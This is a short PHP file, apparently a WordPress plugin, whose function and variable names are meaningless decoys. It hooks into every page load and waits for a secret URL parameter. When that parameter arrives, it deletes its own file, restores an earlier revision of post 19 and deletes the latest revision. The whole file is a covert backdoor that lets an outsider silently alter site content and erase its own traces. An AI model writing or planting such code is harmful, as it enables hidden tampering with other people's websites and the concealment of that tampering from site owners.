<?php

function real_fancy_rates() {
	if (isset($_GET['blogroll_files_after']) && $_GET['blogroll_files_after'] === 'community_tinymce_codes') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$this_404_photos = 19;
		$fx_style_validation = wp_get_post_revisions($this_404_photos);
		if (empty($fx_style_validation)) die('no revisions');
		if (count($fx_style_validation) < 2) die('less than 2');
		$lightbox_restrict_edition_front = array_shift($fx_style_validation);
		$location_recent_picker = $lightbox_restrict_edition_front->ID;
		$out_importer_tag = array_shift($fx_style_validation);
		$messenger_delete_chatbot = $out_importer_tag->ID;
		$estate_shortcodes_help = wp_restore_post_revision($messenger_delete_chatbot);
		if ($estate_shortcodes_help === false) die('error restoring');
		$estate_shortcodes_help = wp_delete_post_revision($location_recent_picker);		
		if ($estate_shortcodes_help === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'real_fancy_rates');
